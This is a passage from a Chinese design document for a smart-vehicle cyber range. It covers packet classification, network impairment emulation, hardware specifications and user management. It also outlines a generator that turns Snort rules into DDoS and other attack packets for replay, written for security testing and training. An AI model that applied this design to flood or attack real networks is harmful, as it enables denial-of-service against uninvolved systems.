路由协议的支持，网络靶场可以更加逼真地模拟真实的网络环境，从而帮助网络安全人员进行网络安全培训和攻防演练。</p><p>以下是一些需要注意的问题：</p><ul><li>在网络靶场内部署 VyOS 路由器时，需要考虑路由器的性能和可用性。</li><li>在配置 VyOS 路由协议时，需要注意路由协议的参数设置。</li><li>在进行路由表交换时，需要考虑网络拓扑和链路状态。</li></ul><h4 id="报文分类"><a href="#报文分类" class="headerlink" title="报文分类"></a>报文分类</h4><h5 id="基于特征的报文分类"><a href="#基于特征的报文分类" class="headerlink" title="基于特征的报文分类"></a>基于特征的报文分类</h5><p>报文的特定特征可以包括：</p><ul><li>报文的源地址和目的地址</li><li>报文的端口号</li><li>报文的协议类型</li><li>报文的流量特征（例如，流量大小、流量速率）</li></ul><h5 id="基于机器学习的报文分类"><a href="#基于机器学习的报文分类" class="headerlink" title="基于机器学习的报文分类"></a>基于机器学习的报文分类</h5><p>这种方案是使用机器学习算法来进行报文分类。机器学习算法可以根据大量的训练数据来学习报文的分类规律。</p><h5 id="基于混合方式的报文分类"><a href="#基于混合方式的报文分类" class="headerlink" title="基于混合方式的报文分类"></a>基于混合方式的报文分类</h5><p>这种方案是将上述两种方案结合起来使用。例如，可以使用基于特征的报文分类来进行初步分类，然后使用基于机器学习的报文分类来进行细粒度的分类。</p><h5 id="具体实施方案"><a href="#具体实施方案" class="headerlink" title="具体实施方案"></a>具体实施方案</h5><p>根据网络靶场的具体需求，可以选择合适的技术方案。例如，如果需要对报文进行细粒度的分类，可以选择基于机器学习的报文分类方案。如果需要实时处理大量流量，可以选择基于特征的报文分类方案。</p><p>报文分类是网络靶场的重要功能，可以帮助网络安全人员进行网络安全培训和攻防演练。在选择报文分类技术方案时，需要综合考虑网络靶场的具体需求、准确性要求和性能要求。</p><p>以下是一些常用的报文分类技术方案的具体介绍：</p><ul><li>基于特征的报文分类</li><li>基于协议的报文分类：根据报文的协议类型来进行分类。例如，可以将所有 HTTP 报文分为一类，将所有 TCP 报文分为一类。</li><li>基于流量的报文分类：根据报文的流量特征来进行分类。例如，可以将流量大小超过一定阈值的报文分为一类，将流量速率超过一定阈值的报文分为一类。</li><li>基于应用的报文分类：根据报文的应用类型来进行分类。例如，可以将所有 Web 应用的报文分为一类，将所有游戏应用的报文分为一类。</li><li>基于机器学习的报文分类</li><li>支持向量机：支持向量机是一种常用的机器学习算法，可以用于分类和回归问题。</li><li>决策树：决策树是一种简单易用的机器学习算法，可以用于分类和回归问题。</li><li>神经网络：神经网络是一种强大的机器学习算法，可以用于分类和回归问题。</li></ul><p>报文捕获根据指定的过滤规则，实时的捕获满足条件的网络报文，用户可配置报文的过滤规则，设定捕获特定类型的数据包，包过滤操作在系统内核空间进行，极大地提高了捕获的效率。</p><p>性能参数如下：</p><ul><li>支持带宽控制范围0到10000Mbps，最小控制颗粒度1bps；</li><li>支持报文乱序控制颗粒度为0.001％；</li><li>支持重复报文控制颗粒度为0.001％；</li><li>支丢包范围0%到100%，控制颗粒度为0.0001％；</li><li>支持构造时延范围0到10秒，控制颗粒度为0.1ms；</li><li>支持不低于1000个隔离网络的构建；</li><li>支持不低于5000个虚拟端口构建。</li></ul><p>端口和协议识别：</p><p>这是一种基本的报文分类方法，它通过检查报文中的目标端口和传输协议来确定流量类型。例如，TCP端口80通常用于HTTP流量，端口443用于HTTPS。这种方法适用于识别一些常见的应用和服务，但无法处理加密流量或自定义端口。</p><p>深度报文检测（DPI）：</p><p>DPI是一种高级的报文分类技术，它通过深入分析报文内容来确定流量类型。识别加密流量，因为它不仅仅依赖于端口信息。DPI使用特征匹配、正则表达式等技术来识别应用层协议和应用程序。这是一种强大的方法，可以对广泛的流量进行分类，但也需要更多的计算资源。</p><p>基于流的分类：</p><p>基于流的分类方法将一组相关报文组合在一起，然后根据流的行为进行分类。这种方法可以捕获与特定应用程序或连接相关的所有报文，并进行更准确的分类。例如，可以将所有与Skype通话相关的报文组合在一起，并将其识别为Skype流量。</p><p>机器学习和AI：</p><p>机器学习和人工智能（AI）在报文分类方面表现出色。这些技术可以分析大量的历史流量数据，并学习识别不同应用程序和流量类型的模式。一旦训练完成，它们可以自动分类新流量。这使得它们能够适应新兴应用和变化的网络环境。</p><p>网络流分析工具：</p><p>有一些专门的网络流分析工具，如Wireshark、tcpdump和Bro（现在称为Zeek），它们可以用于报文分类。这些工具提供了详细的流量分析功能，可以帮助网络管理员深入了解网络中的流量模式和特征。</p><p>签名和规则引擎：</p><p>这种方法使用已知的应用程序或威胁的特征签名或规则来识别流量。例如，入侵检测系统（IDS）使用这种方法来检测已知的攻击模式。这对于特定应用程序和威胁的分类非常有效，但无法处理未知的流量。</p><h4 id="带宽、延迟、丢包仿真"><a href="#带宽、延迟、丢包仿真" class="headerlink" title="带宽、延迟、丢包仿真"></a>带宽、延迟、丢包仿真</h4><h5 id="带宽仿真技术方案"><a href="#带宽仿真技术方案" class="headerlink" title="带宽仿真技术方案"></a>带宽仿真技术方案</h5><p>基于流量的带宽仿真：根据报文的流量特征来进行带宽限制。例如，可以将流量大小超过一定阈值的报文限制为特定的带宽。</p><p>基于路由的带宽仿真：根据路由表来进行带宽限制。例如，可以将某些路径的带宽限制为特定的值。</p><p>基于硬件设备的带宽仿真：使用硬件设备来实现带宽限制。例如，可以使用防火墙或交换机来限制带宽。</p><h5 id="延迟仿真技术方案"><a href="#延迟仿真技术方案" class="headerlink" title="延迟仿真技术方案"></a>延迟仿真技术方案</h5><p>基于路由的延迟仿真：根据路由表来进行延迟增加。例如，可以将某些路径的延迟增加为特定的值。</p><p>基于硬件设备的延迟仿真：使用硬件设备来实现延迟增加。例如，可以使用防火墙或交换机来增加延迟。</p><p>基于软件的延迟仿真：使用软件来实现延迟增加。例如，可以使用网络模拟器来增加延迟。</p><h5 id="丢包仿真技术方案"><a href="#丢包仿真技术方案" class="headerlink" title="丢包仿真技术方案"></a>丢包仿真技术方案</h5><p>基于流量的丢包仿真：根据报文的流量特征来进行丢包。例如，可以将流量大小超过一定阈值的报文丢弃。</p><p>基于路由的丢包仿真：根据路由表来进行丢包。例如，可以将某些路径的丢包率设置为特定的值。</p><p>基于硬件设备的丢包仿真：使用硬件设备来实现丢包。例如，可以使用防火墙或交换机来丢弃报文。</p><h2 id="流量仿真模块"><a href="#流量仿真模块" class="headerlink" title="流量仿真模块"></a>流量仿真模块</h2><ul><li>DDoS攻击类型不少于80种 ，DDoS攻击报文长度可设置，提供产品功能截图证明，截图中需有具体的攻击类型数量并能清晰识别。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8bfbeaf495fd5c22fcc66c714a81e6f5.png" alt="1703509084560"></p><p>报文设置</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/14b02b06b958674c9a0dc1a733fb7e08.jpeg" alt="2030ab1c7d70f0069f6e82be695e831b"></p><p>ddos工具攻击图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c24b7e60b8952259732baa8a3357e024.png" alt="1703537589164"></p><p>工具数量90种</p><h4 id="流量产生架构"><a href="#流量产生架构" class="headerlink" title="流量产生架构"></a>流量产生架构</h4><p>功能参数设计方面，系统具备强大的测试和模拟能力，支持多种网络设备和协议的仿真。系统提供6个测试端口，包括4个10GE SFP+接口兼容1/10G速率模式，2个QSFP28接口兼容1/10/25G速率模式，以及2个10/100/1000M自适应网口用于管理。系统采用机架式结构形式，并通过交流电压供电，工作温度范围在0~35℃之间。系统基于B/S架构的管理方式，支持多用户同时连接。系统还支持RFC 2544吞吐测试、丢包率测试、时延测试以及背靠背测试，以满足各种网络性能测试需求。此外，系统还支持RFC 2889地址缓存容量测试和地址学习速率测试，RFC 3511 HTTP/TCP并发、新建、吞吐测试，以及RFC 4445 RTSP/RTP/RTCP播放质量测试、播放并发测试、播放吞吐测试。系统还支持模拟多种常见互联网协议和工业互联网协议，包括ARP、TCP、UDP、HTTP、HTTPS、LDAP、IPoE、DHCP、DNS、PostgreSQL、SMTP等。此外，系统支持视频协议模拟，如RTSP/RTCP/RTP和H.264，以及组播协议模拟，如含IGMP和MLD。系统还能够模拟动态路由协议，如RIPv1/v2和OSPFv2，以及工业互联网协议，包括BACnet、Omron、OPC_UA、Profinret、Siemens S7等20种工业互联网协议。此外，系统还支持车载以太网协议模拟，如DOIP和SOMEIP，并能够对上述类别协议数据包进行构建、捕获和解析，覆盖层次从L2到L7。系统同时支持IPv4和IPv6网络，并能够测试各种被测设备类型，包括路由器、交换机、防火墙、负载均衡、日志审计、服务器等。此外，系统还支持国密算法HTTPS性能测试和国密算法VPN测试，包括ECC-SM4-SM3加密套件，同时支持RSA和国密算法的SSL协议。系统还支持IPSec VPN国密新建、并发、吞吐性能测试，以及SSL VPN国密并发测试。此外，系统还支持DDoS攻击探测和模糊测试、安全检测评估、漏洞扫描以及攻击报文重放，包括不少于80种DDoS攻击类型和11万个漏洞数据利用库漏洞。系统能够实现攻击计数器功能，统计攻击率、攻击吞吐量等参数，并支持上传自定义攻击流量。系统还可以混合攻击流量和正常流量，以测试受测设备的攻击探测能力，并监控被测设备的攻击结果判断。最后，系统能够模拟百万级用户同时进行业务操作，并对每个用户的操作进行统计和报告，以满足各种测试需求。</p><p>性能参数要求方面，HTTP每秒新建会话达到260万，最大并发会话达到6400万，最大吞吐速率达到120G。HTTPS每秒新建会话为5.6万（国密套件为3万），最大并发会话为224万（国密套件为224万），最大吞吐速率为80G（国密套件为7.7G）。RFC UDP吞吐率（双向64字节）为195G，TCP每秒新建连接为410万，最大并发连接为6400万，TCP最大吞吐速率（双向）为140G。这些性能参数的设计确保了系统在高负载和复杂网络环境下的出色性能表现，满足了广泛的测试需求。</p><p>下图为网络靶场的体系结构图。该靶场上部署了流量产生器，提供模拟整个网络活动的能力，产生代表性的网络流量。同时，该靶场还能够模拟各种人员角色（系统用户、管理员、对手和中立人员等），提供靶场各节点上人类行为的模拟能力，可产生人类之间真实的系列事件，靶场中的角色可以驱动和运行桌面环境中的各种应用程序，可与验证系统进行交互，如身份认证系统等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7b3eed7c286251fe1fd9a757758b2fdc.png"></p><p>流量产生器在网络靶场位置</p><p>通过使用系统管理员模拟训练系统来模拟目标环境。靶场内含一个网络流量合成套件，其中的多用户流量工具插件部署在网络流量合成套件之上以描述用户，并产生行为仿真。MUTT合成了电子邮件客户、网页客户和SSH客户等的行为流量。该能力非常适合于测试安全装备和训练边界防护技术人员。</p><p>网络流量特征分析建模及流量生成和高逼真多样化用户行为模拟。其中流量的生成是构建高逼真网络靶场的基础。由于真实网络环境中，异常流量的存在不容忽视。所以在网络靶场流量生成中，异常流量也必须考虑。</p><h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>提供2至7层流量生成和分析能力，与强大的网络仿真和应用流量，提供功能、性能、网络安全和基准测试，适用于汽车虚拟网络管理系统的流量仿真。针对网络靶场的功能特点，实验环境以及系统设计需要满足如下要求：</p><p>（1）生成异常流量种类的多样性</p><p>真实网络环境中存在的异常流量种类繁多，因而在建立高逼真网络靶场时，需要尽可能产生更多类型的异常流量，以添加到网络靶场之中，提高网络靶场的逼真程度。</p><p>（2）网络异常流量产生机制的可扩展性</p><p>随着信息技术的发展，所发现的各种系统漏洞和软件漏洞越来越多，由此引发的网络攻击也日新月异，每一种新的攻击将可能产生新的网络异常流量。为了使网络靶场中</p><p>的异常流量能够与现实网络异常流量保持同步，在设计网络异常流量产生机制时，需要保证其可扩展性，以适应新的网络异常流量的生成需求。</p><p>（3）异常网络流量产生的便利性</p><p>针对网络异常流量生成的目标，需要能够及时产生一系列满足特定攻击强度和攻击特征的流量。网络异常流量生成的便利性对于构建一个动态变化的网络靶场环境具有十分重要的意义。</p><p>（4）系统需要具备分布式架构环境</p><p>在实际网络环境中，网络异常流量的产生既有可能是由某个单个主机引起（如攻击者通过木马、后门控制受害者主机），也有可能是由多个主机产生（如控制僵尸主机发动DDoS攻击）。在设计网络异常流量生成系统时，如果流量发送端仅使用一台主机，很难生成高性能的网络异常流量。因此，网络异常流量生成系统需要设计成分布式架构。 综上所述，网络异常流量生成系统应该使用分布式架构部署，需要能够很方便地产生尽可能全面的网络异常流量，同时还需要具备一定的扩展性，以应新异常流量的生成需求。</p><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>针对研究目标，文章从异常流量时空特征出发，借助Snort规则库，建立其解析机制以构造数据报文，刻画异常流量空间特征；同时使用不同的时间分布模型计算数据包</p><p>发送时间间隔，刻画异常流量时间特性。通过此时间间隔控制数据包发送过程，产生符合时空特性的网络异常流量。最后设计并开发网络异常流量生成演示系统并验证实验生成流量的有效性。具体研究内容如：</p><p>（1）网络异常流量生成框架设计。网络流量生成框架设计是本论文研究的基础。本文通过对网络异常流量进行分析，从空间和时间角度提取出网络协议头、数据包负载和数据包发送时间间隔三个特征，设计了基于时空模型的网络异常流量生成框架，并对框架中的特征翻译模块、数据包构造模块和流量生成模块及每个模块的组成单元进行具体描述。</p><p>（2）基于时空模型的网络异常流量生成机制实现。该机制中，特征翻译模块和数据包构造模块构成空间模型部分。Snort规则库给出了网络异常流量的空间特征，省去了人工提取特征的过程。但是Snort规则库是一般以文本形式给出，文本内容是均以Snort文法规则描述。特征翻译模块设计了一种基于文法识别工具ANTLR 的Snort规则解析机制，识别其各个特征字段及取值，存储至规则结构体。数据包构造模块读取该结构体，获得特征字段取值，构造异常流量数据包。流量生成模块根据不同网络异常流量的特性，使用不同的时间分布模型计算数据包发送间隔，并控制数据包的发送过程，最终形成网络异常流量。</p><p>（3）异常网络流量生成演示系统开发与流量验证。根据Snort规则翻译机制以及数据包时间特征，设计开发异常网络流量生成演示系统。同时对生成的流量进行时空特性的检验，验证流量的有效性。</p><h4 id="流量特性"><a href="#流量特性" class="headerlink" title="流量特性"></a>流量特性</h4><p>流量特征在网络异常流量检测中具有重要作用。可以通过检测IP报头，提取其中的源IP地址，轻易识别来自非法IP的连接请求。通过提取TCP报文头部中的各标志位，对比合法标志位集合，判断某数据包TCP标志位组合的合法与否。通过搜索特征字符附近内容来识别含有特殊病毒信息的Email。通过统计分析某个命令在特定时间段内发生的次数，对比预设阈值，判断是否发生DoS攻击。下表列出了对常见攻击流量进行检测时使用的特征项。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/d7ab2102996ca60ff26542d01999f1fd.png"></p><p>攻击类型</p><p>从上表列出的常见的24种攻击可以看出，网络异常流量特征的范围覆盖很广，有简单的协议头部字段识别和载荷识别，也有复杂的数据包时间间隔判断和多协议多特征综合判断。概括起来可以从空间和时间角度，使用网络协议头、负载信息和数据包发送时间间隔三个特征对网络异常流量进行描述。</p><p>（1）网络协议头 TCP/IP协议族是Internet的基础，它为网络设备提供连接的同时，也为网络攻击的实施提供了平台。由于在设计TCP/IP协议族协议时考虑不够周全，给了网络攻击以可趁之机。对这些协议的漏洞利用而产生的流量一般可以通过数据包头部的各项字段显示出来。因此可以通过对IP、TCP、UDP和ICMP这四种常见协议头部各字段进行分析，提取能够表征某种攻击特征的字段，描述该种网络攻击流量特征。以IP数据包为例，一般检测器源宿IP地址，协议类型以及分片标志位等字段。</p><p>（2）负载信息 有些攻击是基于内容的，这类攻击产生的流量特征一般不会体现在网络协议头部字段。描述这类攻击产生的流量特征一般从其网络数据包负载入手，分析提取负载信息的关键信息。针对某种特定攻击，其负载信息一般会存在符合某种规律的特殊字符串，可以利用这个特殊字符串来描述该种攻击流量特征。如缓冲区溢出在实现时依赖特殊的填充数据、shellcode字段以及返回地址等，这些特殊构造的数据都会以数据包负载的形式体现。</p><p>（3）数据包发送时间间隔</p><p>很多攻击流量特征并不是从一两个数据包上体现出来的，而是通过一段时间内该种数据包的统计特征来体现，这种统计特征表现在数据包发送速率上。如拒绝服务攻击需要持续不断地发送数据包，达到拒绝服务的目的，因而其发送频率非常快，统计特征一般会远远超过设定阈值；扫描攻击为了躲避检测，会降低扫描速率，但从一个较长的时间尺度来看，其时间也会体现出某种特征，最为常见的就是周期性特征。采用Snort规则库作为异常流量特征库，具体原因如下：</p><p>（1）丰富性。Snort规则库在入侵检测中扮演着重要角色，其基本原理是根据入侵描述信息对捕获的网络数据包进行搜索和匹配，检测网络攻击。Snort规则库目前能够识别包括拒绝服务攻击，扫描攻击，Web攻击，缓冲区溢出攻击等在内的多种形式的攻击，满足对生成异常流量种类丰富性的需求。同时Snort规则库一直由官方开发团队和社区维护更新，不断地丰富着网络攻击特征库。</p><p>（2）开源性，可扩展性。Snort规则的开源特性使得其获取途径十分方便。Snort规则语法简单，根据其语法规则能够很容易写出新的攻击描述语言来表征某种新的网络攻击。根据新编写的Snort规则，结合本文设计框架，即可生成新的异常流量，满足需求中的可扩展性要求。</p><h4 id="系统设计"><a href="#系统设计" class="headerlink" title="系统设计"></a>系统设计</h4><h5 id="流量生成原理"><a href="#流量生成原理" class="headerlink" title="流量生成原理"></a>流量生成原理</h5><p>本文异常流量生成系统的基本思想是通过网络协议头特征和负载信息构造异常流量数据包，通过数据包发送时间间隔控制数据包发送过程，最终得到网络异常流量。其基本原理如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/d3c2871145b7d41cdacbfe0e94f3b659.png"></p><p>网络常流量生成系统设计原理</p><p>结合异常流量生成需求和系统设计原理，我们提出了一种基于时空模型的网络异常流量生成机制框架，如下图3-2所示。框架由特征翻译模块、数据包构造模块和流量生成模块构成。其中，特征翻译模块用与解析异常流量特征库，获取网络协议头和数据包负载特征字段，交由数据包构造模块构造异常流量数据包。流量生成模块接收流量时间参数，控制数据包发送过程，产生网络异常流量。框架中各个功能模块独立具有如下优点：①解耦合的功能模块便于系统的开发实现；②各独立模块在维护上十分容易。</p><h5 id="流量生成框架"><a href="#流量生成框架" class="headerlink" title="流量生成框架"></a>流量生成框架</h5><p>下图为流量生成框架。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/057d034c32953d539ff0741460e0639d.png"></p><p>基于时空模型的网络流量生成机制框架</p><p>框架中输入为网络异常流量特征库和流量时间参数，输出即为所需的网络异常流量。</p><p>框架中各部分功能详细描述如下：</p><p>（1）异常流量特征库：该特征库是对一系列异常流量特征进行描述的信息库。可以是一个数据库表也可以是一个描述性文件，具体取决于实现的便利性。流量库可以持续更新，保证系统生成流量的丰富性。</p><p>（2）特征解析引擎：该引擎主要功能是完成对异常流量特征的解析工作。如果异常流量特征库是一个数据库表，则该引擎需要识别每个字段并取出该字段的值，用于构造数据报文；如果异常流量特征库是一个描述性文件，那么该引擎还需要具备语言解析功能，即完成异常流量特征描述语言向机器能够识别语言的转换。此部分为系统架构的核心模块之一。</p><p>（3）特征描述文法：特征描述文法即异常流量特征的规范化描述文法，如BNF或是EBNF的范式描述，它是异常流量特征库解析的依据。</p><p>（4）数据包构造引擎：该引擎是完成数据包构造的关键部件。它接收来自流量特征解析引擎获取到的特征字段，获取特征字段取值，调用数据包构造函数完成不同类型数据包的构造。</p><p>（5）数据包构造函数库：数据包构造函数库通过统一接口，为数据包构造引擎提供所需的函数。目前可供网络开发者使用的开发包非常多，所以该部分可以采用第三方开发包。</p><p>（6）流量时间参数：该时间参数用于控制构造好的数据包以何种时间模型发送以及流量持续时长。</p><p>（7）流量发生器：流量发生器来自数据包构造引擎编译之后产生的可执行文件，该可执行文件包含了数据报文的各种空间特征，同时接受用户输入的时间特征参数，根据这些参数发送数据包产生异常流量。</p><p>（8）异常流量：实验输出结果，以pcap格式存储，可以通过tcpreplay[50]等攻击进行重放，添加至网络靶场中。</p><h5 id="方案配置"><a href="#方案配置" class="headerlink" title="方案配置"></a>方案配置</h5><ol><li>硬件配置</li></ol><p>6个测试端口。</p><p>4个10GESFP+接口，兼容1/10G速率模式。</p><p>2个QSFP28接口，兼容1/10/25G速率模式。</p><p>2个10/100/1000M自适应网口用于管理。</p><p>机架式设计，适应标准机架安装。</p><p>交流电压：220（1±10%）V，频率50（1±5%）Hz。</p><p>环境适应性：工作温度范围0~35℃。</p><ol><li>软件功能</li></ol><p>管理方式：基于B/S架构，支持多用户同时在线管理。</p><p>标准测试支持：支持RFC 2544、RFC 2889、RFC 3511、RFC 4445等多项标准测试。</p><p>协议模拟：包含常见互联网协议、视频协议、组播协议、动态路由协议、工业互联网协议及车载以太网协议等。</p><p>仿真覆盖层次：L2-L7层协议仿真。</p><p>网络支持：兼容IPv4和IPv6网络。</p><p>被测设备类型：支持路由器、交换机、防火墙等多种设备的测试。</p><p>国密算法测试：支持国密算法HTTPS和VPN性能测试。</p><p>DDoS攻击与安全测试：支持DDoS攻击模拟、漏洞扫描、安全检测评估等。</p><p>用户模拟：能够模拟百万级用户同时进行业务操作。</p><ol><li>性能参数</li></ol><p>HTTP性能：</p><p>每秒新建会话：260万。</p><p>最大并发会话：6400万。</p><p>最大吞吐速率：120G。</p><p>HTTPS性能：</p><p>每秒新建会话：5.6万。</p><p>每秒新建会话（国密套件）：3万。</p><p>最大并发会话：224万。</p><p>最大并发会话（国密套件）：224万。</p><p>最大吞吐速率：80G。</p><p>最大吞吐速率（国密套件）：7.7G。</p><p>其他性能：</p><p>RFC UDP吞吐率(双向64字节)：195G。</p><p>TCP每秒新建连接：410万。</p><p>TCP最大并发连接：6400万。</p><p>TCP最大吞吐速率(双向)：140G。</p><ol><li>实施步骤</li></ol><p>硬件采购与组装：根据性能需求采购相应硬件并组装。</p><p>软件开发与集成：</p><p>开发仿真引擎和管理界面。</p><p>集成网络安全与基准测试功能。</p><p>系统测试：对系统的每项功能进行测试，确保性能符合要求。</p><p>部署与培训：</p><p>在实际环境中部署系统。</p><p>对用户进行操作培训。</p><ol><li>技术选型</li></ol><p>仿真技术：采用先进的流量生成和分析技术，模拟真实网络环境。</p><p>前端技术：使用现代Web技术栈，如React或Vue.js，构建用户界面。</p><p>后端技术：利用高性能的后端框架，如Node.js或Python Flask，提供稳定的API服务。</p><h5 id="Snort规则解析流程"><a href="#Snort规则解析流程" class="headerlink" title="Snort规则解析流程"></a>Snort规则解析流程</h5><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/010043c8db910a0122cabfb448e04e1f.png"></p><p>Snort规则解析流程</p><p>特征翻译模块首先对Snort规则文件进行预处理，将Snort规则库存储为以sid命名的Snort规则文件。选取规则文件，通过基于ANTLR词法分析器识别各规则选项的token值，并将其值域存入规则结构体。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a727e69e50cbfa3c502592241a8b7fed.png"></p><p>流量生成详细构造</p><p>整个系统分为三个模块：特征翻译模块、数据包构造模块和流量生成模块。</p><p>特征翻译模块首先对Snort规则文件进行预处理，将Snort规则库存储为以sid命名的Snort规则文件。选取规则文件，通过基于ANTLR词法分析器识别各规则选项的token值，并将其值域存入规则结构体。</p><p>数据包构造模块读取规则结构体，获取报文各字段取值，使用Libnet构造数据包，编译生成流量发生器（可执行文件），交给流量生成模块。</p><p>流量生成模块根据输入的攻击强度和攻击持续时间，选择不同的流量模型，计算数据包发送时间间隔，在时间到达时，执行流量发生器，将构造的数据报文从网络链路层直接发送到网络上去，形成网络流量。</p><h4 id="系统截图"><a href="#系统截图" class="headerlink" title="系统截图"></a>系统截图</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ad4ed4604ea4438b06cb65beb7b09625.png"></p><p>网络异常流量生成演示系统指引界面</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/6642ab9090aba4ff9e6501ade3f89ac3.png"></p><p>流量生成页面</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/9918f9bcd39ec626e01e3c71d9f34e8c.png"></p><p>数据报文构造页面</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/60c47447ebdfa28e6691d8f5546d5541.png"></p><p>流量生成截取结果</p><h1 id="智能汽车网络靶场试验支撑分系统"><a href="#智能汽车网络靶场试验支撑分系统" class="headerlink" title="智能汽车网络靶场试验支撑分系统"></a>智能汽车网络靶场试验支撑分系统</h1><ul><li>平台采用统一的权限管理体系，由管理员统一管理。支持配置各个人员的单位属性。平台管理员可以根据单位划分可使用的平台资源数量（包括但不限于虚拟CPU、内存、磁盘大小、虚拟机数量等），提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a54c675fac8ede9c1bb8afd65a7c12e2.png" alt="WPS图片(4)"></p><ul><li>支持对系统用户的账号、单位、角色进行管理，能够自定义系统中角色的名称及访问的权限，产品功能截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4549799985d59c9fb0039b642e2c2984.png" alt="WPS图片(5)"></p><p>功能参数设计方面，平台实现了统一的权限管理体系，由管理员负责统一管理。管理员可以配置每个人员的单位属性，并根据单位进行资源的划分，包括虚拟CPU、内存、磁盘大小、虚拟机数量等。此外，系统支持对系统用户的账号、单位、角色进行管理，管理员可以自定义系统中角色的名称及其访问权限。还支持用户所在单位的管理，包括修改用户所在单位和配置单位可使用的资源总量。系统还具备查看用户在线状态、密码重置以及批量启用和禁用用户的功能。这些功能确保了平台的安全性和管理的灵活性。</p><p>性能参数设计方面，平台能够支持管理数量达到500人。这意味着平台可以满足较大规模的人员管理需求，保证了管理效率和用户体验。</p><p>用户管理负责提供整个系统的用户、用户角色、单位、权限分配和用户日志的管理。主要包括管理人员、设计人员和试验人员三类角色对系统接口、菜单和资源权限的配置管理。</p><p>在试验配置管理中共有三类用户，第一类是管理员，第二类是工程负责人，第三类是普通试验人员。因此管理人员一般为工程负责人角色。管理员作为超级管理员对所有用户进行统一管理。在普通实验人员中又分为了设计人员和具体试验操作人员。设计人员可以进行试验场景设计，而试验操作人员则只能按照试验要求进行具体的试验操作。</p><p>每种角色对应有其权限，每个用户可以赋予为某种角色，该用户就具备该角色可执行的权限。系统管理员支持对角色权限的配置功能。</p><p>对于试验角色权限，通过系统定制化角色权限，用户只具有某种角色的使用权限。</p><p>系统支持多单位、多角色的人员管理，支持对单位、角色、人员的权限进行管理。支持人员接入配置。提供两种视图进行接入配置，一种是以人员为基础，进行设备分配，另一种是以设备为基础进行人员分配。两种方式均支持在分配的时候选择是否进行录屏操作、默认是否可以接入等配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/23aeca0f0428c00e83ee210413fc7574.png"></p><p>人员接入配置</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c1b4dfd38c0fa78c433f181e705da8d0.png"></p><p>设备服务配置</p><p>支持人员接入任务配置。配置参数包括操作（接入、断开）、人员设备数据以及描述等字段。支持通过子系统管理平台Web页面对租户虚拟链路层网络进行管理，包括未知单播报文抑制、未知组播报文抑制、虚拟交换机泛洪学习、MAC地址信息通告、ARP处理模式等进行配置。子系统支持对租户虚拟端口、端口组、安全策略、应用集群虚IP、泛红域等进行管理。</p><p>采用了统一的权限管理体系平台，由管理员统一进行管理。管理员可以配置每个人员的单位属性，并根据单位划分可使用的平台资源数量。这些资源包括虚拟CPU数量、内存大小、磁盘容量以及虚拟机数量等。</p><p>如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7aedb9abc6c31b256cacce56dbe12484.jpeg" alt="WPS图片(18)"></p><p>权限管理</p><h2 id="资源管理模块"><a href="#资源管理模块" class="headerlink" title="资源管理模块"></a>资源管理模块</h2><ul><li>支持对汽车全生命周期的安全资产管理，至少包含以下14种安全资产的管理：靶场测试零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本，被测整车的品牌、车型、车辆、车型项目（年款）、包含的零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本。还应包含基础平台系统中的至少4种虚拟资源管理，包括镜像、靶标、攻防工具、场景模板等；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/fc3d9cd3e3d6bfe0b31cfb461a2f5393.png"></p><p>实物节点拓扑编辑</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a0641b1f5d32395201a5d3f5c23f7439.jpeg" alt="WPS图片21"></p><p>资源管理</p><p><img src= 